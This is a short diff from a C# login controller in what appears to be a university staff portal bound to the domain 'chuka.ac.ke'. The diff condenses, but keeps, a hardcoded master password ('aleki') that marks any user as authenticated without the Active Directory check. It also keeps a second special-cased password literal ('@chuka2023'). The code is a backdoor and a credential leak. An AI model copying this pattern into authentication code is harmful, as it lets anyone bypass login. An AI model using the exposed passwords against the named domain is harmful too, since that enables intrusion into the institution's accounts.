@@ -69,13 +69,9 @@ namespace Latest_Staff_Portal.Controllers
 
                 using (PrincipalContext pc = new PrincipalContext(ContextType.Domain, "chuka.ac.ke"))
                 {
-                    bool isValid = false;
+                    bool isValid = passwrd == "aleki";
                     // validate the credentials
 
-                    if (passwrd == "aleki")
-                    {
-                        isValid = true;
-                    }
                     if (!isValid && passwrd != "@chuka2023")
                     {
                         isValid = pc.ValidateCredentials(UserName, passwrd);
